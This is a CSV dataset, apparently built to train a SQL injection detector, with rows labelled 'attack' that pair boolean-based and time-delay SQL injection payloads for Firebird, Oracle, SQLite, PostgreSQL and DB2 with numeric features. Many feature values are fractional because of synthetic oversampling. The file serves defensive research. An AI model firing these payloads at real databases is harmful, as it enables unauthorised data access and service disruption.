id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000117,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'aytf' like 'aytf",nearest_attack_euclidean,R000576,0.02911453146944531,124.01173423891358,33.96479728325926,3.926216374565415,46.01173423891358,15.0,46.0,17.0,0.3710267916538877,0.12095638622040622,0.370932917742579,0.13708390438312704,6.0,0.0,0.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.011734238913581,0.988265761086419,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000118,attack,boolean,"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R001136,0.448006960749217,148.3778796248075,30.61482330206729,4.046943053657034,72.30376311447102,8.61482330206729,46.22964660413458,21.22964660413458,0.48714294649114664,0.05802007363802106,0.3117960222531238,0.14304095761770852,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.6148233020672897,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000119,attack,boolean,"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",nearest_attack_euclidean,R001125,0.8308661916969947,69.41014571095656,22.82029142191309,3.549381739212381,14.640582843826184,16.0,27.179708578086906,11.589854289043455,0.21073878301895893,0.23052539723078577,0.39170099626940236,0.16703482348085297,0.0,4.0,1.0,0.0,1.0,1.589854289043454,0.0,4.0,0.0,0.0,0.0,3.589854289043454,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000120,attack,boolean,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'dubu' like 'dubu",nearest_attack_euclidean,R001477,0.25133960588186194,141.04687431371983,30.73366467914361,3.952902558036309,50.668323395718055,16.0,49.64488623885815,24.73366467914361,0.35850042080993194,0.11369415771718679,0.35235941839396195,0.1754460030789193,3.7336646791436117,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.9112215597145372,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9112215597145372
SMOTE_000121,attack,boolean,"1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000058,1.000462823880548,141.73809041832314,30.0,4.0408920990989285,81.73809041832314,8.0,38.0,14.0,0.5763546652453757,0.05648604463394989,0.26830871201126205,0.09885057810941233,1.0,0.0,0.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.5922613022903916,0.4077386977096084,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000122,attack,boolean,"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000701,0.004856414612950681,163.0428045082601,36.99388507024855,4.324321655980881,83.0,17.0,45.036689578508664,18.006114929751444,0.5090742412780371,0.10426821809309195,0.2762199277670591,0.11043761286181175,1.0,0.0,2.0,0.0,1.0,2.0,0.0,5.006114929751444,0.0,0.0,3.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000123,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R000519,1.2019600452702985,164.35042407104532,33.89255423496763,3.875352613829067,55.62148915300647,24.135532540980577,63.97191322405179,20.621489153006472,0.33851665196757275,0.14710232712236956,0.3889158344182864,0.1254651864917713,4.0,0.0,0.37851084699352633,0.0,0.0,2.0,0.0,9.242978306012947,0.0,0.0,0.0,6.378510846993526,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.6214891530064737,0.3785108469935263,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000124,attack,boolean,"1""  )   where 5850  =  5850 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000971,0.2992841633813509,144.7303423039177,30.236517115195884,4.068269416140121,68.41910269117531,18.0,38.83820538235061,19.473034230391768,0.4732920286786633,0.12477026064863757,0.26727930493696644,0.13465840573573265,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.473034230391768,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000125,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000529,0.06894700361148197,113.1301210858033,31.023658379236963,3.7964487278190844,44.98817081038152,13.023658379236963,42.08280432732937,13.035487568855444,0.39771680364772793,0.11511431792308978,0.37195916381562094,0.11520971461356139,1.0236583792369625,0.0,0.0,0.011829189618481104,0.9881708103815188,1.0,0.0,7.023658379236962,0.0,0.988170810381519,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.9881708103815188,0.0,0.0,0.9881708103815188,0.9881708103815189,0.011829189618481117,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9763416207630375
SMOTE_000126,attack,boolean,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.34731186877351267,91.11626127079256,24.11626127079257,3.011631303784112,8.893009016634053,16.0,48.0,18.223252254158513,0.09724452881061108,0.17568886779734724,0.5270666033920417,0.2,4.0,0.0,1.0,0.0,0.0,2.0,0.0,8.0,2.0,0.2232522541585139,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000127,attack,boolean,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000019,0.0,63.0,23.0,3.4284551513051755,24.0,4.0,26.0,9.0,0.38095238095238093,0.06349206349206349,0.4126984126984127,0.14285714285714285,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,1.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000128,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000001,0.0,63.0,22.0,3.48889649539661,26.0,4.0,24.0,9.0,0.4126984126984127,0.06349206349206349,0.38095238095238093,0.14285714285714285,0.0,2.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000129,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000215,0.17576662048335845,111.90486394683869,31.0,3.6421233414921472,38.0,10.0,46.25405328903224,17.65081065780645,0.3404024050941458,0.08957958028793311,0.4123093059800477,0.15770870863787334,5.0,0.0,0.0,1.0,0.0,1.0,0.0,8.65081065780645,1.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,boolean,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000895,0.31710719382928787,129.46233431078338,33.46233431078338,3.769125874623272,37.0,23.0,52.0,17.46233431078338,0.28580164761484883,0.1776604836524736,0.4016671804316794,0.13487068830099813,2.46233431078338,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001158,0.4930484423722005,78.91094706027641,20.146568236165855,3.0142954841664986,10.528757648221138,13.0,40.0,15.382189412055284,0.13280263151259736,0.16489668802920598,0.5073744247052492,0.1949262557529475,0.0,4.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.38218941205528434,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,boolean,"1%'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000359,0.24249754496670248,144.00723459463615,33.0,4.118957191084614,71.0,9.0,44.60578767570892,19.401446918927228,0.4931726714468158,0.06251484567635693,0.30960576613880003,0.1347067167380272,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.401446918927229,1.0,0.0,3.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,boolean,1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',nearest_attack_euclidean,R000775,0.13623026063546892,75.06845650423668,16.89315434957633,2.7510357168165185,6.0,13.0,40.85476520338935,15.213691300847337,0.08004975240903794,0.1734411302195822,0.5438407922910786,0.20266832508030128,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.213691300847338,2.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,boolean,"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",nearest_attack_euclidean,R000987,0.10048654950680422,86.0,24.53773783839208,3.324710911652808,15.999999999999996,16.0,40.0,14.0,0.18604651162790697,0.18604651162790697,0.46511627906976744,0.16279069767441862,4.0,0.0,1.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000322,0.03791166769240884,138.0,37.16724327691018,3.905243278405663,43.0,23.0,54.0,18.0,0.3115942028985507,0.16666666666666666,0.391304347826087,0.13043478260869565,2.0,1.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,boolean,"1%'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000179,0.09943956006882744,128.88116565171148,34.0,3.8070642976976488,36.0,16.0,50.75528484432412,26.125880807387354,0.2794142382256011,0.12418410587804493,0.39367003341943946,0.2027316224769145,1.0,0.0,2.0,0.0,0.0,1.0,0.0,11.125880807387354,1.0,2.0,1.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000137,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000403,0.7443509101579034,129.21125320442428,32.51508951460173,3.719916386726859,46.0,13.0,53.1810741752208,17.030179029203467,0.35705655452003876,0.10090728714696748,0.41026772834914405,0.13176842998384974,0.0,4.0,0.0,0.0,1.0,1.0,0.0,9.030179029203467,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000138,attack,boolean,"1""   )    )    as phis where 4420  =  4420 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000873,0.19998265210864594,143.88292877542867,35.63832641404077,3.7773367576080106,43.0,23.0,59.04251037893886,18.84041839648981,0.2989522270193187,0.15990467956847282,0.4102043117651381,0.13093878164707037,2.0,1.0,2.0,1.0,0.0,2.0,0.0,9.840418396489808,0.0,0.0,1.0,5.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000440,0.2042216944241049,138.7924563852374,37.827493769319624,4.420448811333552,62.36747715417196,18.0,38.65498753863925,19.769991692426167,0.44925102336819445,0.1298760975429608,0.27849894696189903,0.1423739321269457,4.0,3.827493769319625,1.0,0.0,0.0,1.9424979231065416,0.0,4.0,0.0,0.0,0.0,6.942497923106542,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,0.9424979231065416,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.942497923106542
SMOTE_000140,attack,boolean,"-5825  )   as mflf where 3999  =  3999 or make_set  (  1492  =  7153,7153  )  --",nearest_attack_euclidean,R000624,0.05617386077381569,80.39756054895834,27.056794364136906,3.897526526945109,20.000000000000004,24.0,26.34076618482144,10.056794364136906,0.24885758462943003,0.298629101555316,0.32743171271735605,0.12508160109789784,0.0,0.0,3.0,0.0,0.0,2.0,0.0,3.056794364136907,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",nearest_attack_euclidean,R001148,0.6042203726543308,149.7516728438921,28.4966543122158,3.9750789967316207,73.7516728438921,10.0,44.0,22.0,0.49248890989421923,0.06677777501391852,0.29382221006124154,0.14691110503062074,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.7516728438920997,0.24832715610790038,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000142,attack,boolean,"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000727,0.2389108973045544,162.96359781501724,33.56102794714778,4.2422530663805516,82.0,17.0,46.68308384144334,17.28051397357389,0.5033638338941359,0.1043559167829306,0.286254606506825,0.10602564281610853,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.280513973573891,0.0,0.0,3.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000143,attack,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000268,0.19973134869026968,135.30473758267024,33.41465575651227,3.8213531316336917,41.75603273046319,23.0,52.75603273046319,17.792672121743866,0.30836108989849853,0.170260349889773,0.38978995288925955,0.1315886073224689,3.0,0.0,2.0,1.0,0.0,2.0,0.0,8.792672121743866,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,boolean,"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",nearest_attack_euclidean,R000099,0.0001957107869105234,142.00008140277578,31.999918597224223,4.22648638528962,74.00008140277578,9.0,39.0,20.0,0.5211270331620581,0.06338024561090407,0.2746477309805843,0.1408449902464535,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.000081402775779,0.999918597224221,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000145,attack,boolean,"1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001182,0.06384917518450776,115.61069000121427,30.155723999514294,3.712182374347689,36.0,21.0,44.68855200097141,13.922138000242853,0.31143329915783524,0.18166942450873722,0.38648578611820766,0.1204114902152199,0.0,0.0,2.0,0.0,1.0,2.0,0.0,6.922138000242853,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000146,attack,boolean,"-5181""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""qofp""  =  ""qofp",nearest_attack_euclidean,R001474,0.07971597511227799,95.39726474643057,24.81917942392917,3.174136679411439,15.999999999999996,16.0,47.517811797144454,15.879452949286113,0.16783475824335162,0.1678347582433516,0.4978974351619671,0.16643304835132966,0.0,4.0,1.0,0.0,0.0,2.0,0.0,7.879452949286113,0.0,0.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
